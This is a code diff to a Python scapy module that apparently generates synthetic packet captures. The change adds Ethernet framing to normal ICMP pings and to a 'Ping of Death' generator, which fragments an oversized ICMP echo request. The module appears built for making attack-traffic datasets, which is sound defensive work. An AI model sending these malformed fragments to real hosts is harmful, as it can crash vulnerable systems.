@@ -10,7 +10,7 @@ on vulnerable systems.
 import random
 import time
 from typing import List, Dict, Any
-from scapy.all import IP, ICMP, wrpcap, fragment
+from scapy.all import Ether, IP, ICMP, wrpcap, fragment
 
 # Import the attack base class
 from .attack_base import AttackBase, AttackParameter
@@ -21,7 +21,9 @@ def generate_normal_pings(
     target_ip: str,
     num_pings: int,
     base_time: float,
-    sequence_start: int = 1
+    sequence_start: int = 1,
+    source_mac: str = "00:0c:29:1d:84:e1",
+    target_mac: str = "00:0c:29:2a:3f:b2"
 ) -> List:
     """
     Generate normal ICMP echo request/reply pairs.
@@ -32,6 +34,8 @@ def generate_normal_pings(
         num_pings: Number of normal ping exchanges to generate
         base_time: Starting timestamp
         sequence_start: Starting sequence number for ICMP packets
+        source_mac: Source MAC address (default: VMware OUI)
+        target_mac: Target MAC address (default: VMware OUI)
         
     Returns:
         List of normal ICMP packets
@@ -43,7 +47,7 @@ def generate_normal_pings(
         seq_num = sequence_start + i
         
         # ICMP Echo Request (Type 8, Code 0)
-        echo_request = IP(src=source_ip, dst=target_ip) / ICMP(
+        echo_request = Ether(src=source_mac, dst=target_mac) / IP(src=source_ip, dst=target_ip) / ICMP(
             type=8,  # Echo Request
             code=0,
             id=random.randint(1, 65535),
@@ -53,7 +57,7 @@ def generate_normal_pings(
         # Recalculate checksums
         del echo_request[IP].chksum
         del echo_request[ICMP].chksum
-        echo_request = IP(bytes(echo_request))
+        echo_request = Ether(bytes(echo_request))
         
         echo_request.time = current_time
         packets.append(echo_request)
@@ -63,7 +67,7 @@ def generate_normal_pings(
         reply_time = current_time + rtt
         
         # ICMP Echo Reply (Type 0, Code 0)
-        echo_reply = IP(src=target_ip, dst=source_ip) / ICMP(
+        echo_reply = Ether(src=target_mac, dst=source_mac) / IP(src=target_ip, dst=source_ip) / ICMP(
             type=0,  # Echo Reply
             code=0,
             id=echo_request[ICMP].id,
@@ -73,7 +77,7 @@ def generate_normal_pings(
         # Recalculate checksums
         del echo_reply[IP].chksum
         del echo_reply[ICMP].chksum
-        echo_reply = IP(bytes(echo_reply))
+        echo_reply = Ether(bytes(echo_reply))
         
         echo_reply.time = reply_time
         packets.append(echo_reply)
@@ -89,7 +93,9 @@ def generate_ping_of_death(
     target_ip: str,
     payload_size: int,
     base_time: float,
-    sequence_num: int = 1000
+    sequence_num: int = 1000,
+    source_mac: str = "00:0c:29:1d:84:e1",
+    target_mac: str = "00:0c:29:2a:3f:b2"
 ) -> List:
     """
     Generate a Ping of Death attack using fragmented oversized ICMP packets.
@@ -104,6 +110,8 @@ def generate_ping_of_death(
         payload_size: Size of the malicious payload (should be > 65507)
         base_time: Timestamp for the attack packets
         sequence_num: Sequence number for the ICMP packet
+        source_mac: Source MAC address (default: VMware OUI)
+        target_mac: Target MAC address (default: VMware OUI)
         
     Returns:
         List of fragmented ICMP packets forming the Ping of Death
@@ -123,7 +131,7 @@ def generate_ping_of_death(
     # Create malicious payload
     payload = b'X' * payload_size
     
-    # Create the oversized ICMP packet
+    # Create the oversized ICMP packet (without Ethernet for fragmentation)
     malicious_ping = IP(src=source_ip, dst=target_ip) / ICMP(
         type=8,  # Echo Request
         code=0,
@@ -136,12 +144,14 @@ def generate_ping_of_death(
     # Each fragment will be < MTU (typically 1500 bytes)
     fragments = fragment(malicious_ping, fragsize=1400)
     
-    # Assign timestamps to fragments
+    # Add Ethernet headers to fragments and assign timestamps
     # Fragments are typically sent very quickly in succession
     current_time = base_time
     for i, frag in enumerate(fragments):
-        frag.time = current_time + (i * 0.0001)  # 0.1ms between fragments
-        packets.append(frag)
+        # Wrap the IP fragment in an Ethernet frame
+        eth_frag = Ether(src=source_mac, dst=target_mac) / frag
+        eth_frag.time = current_time + (i * 0.0001)  # 0.1ms between fragments
+        packets.append(eth_frag)
     
     return packets
 
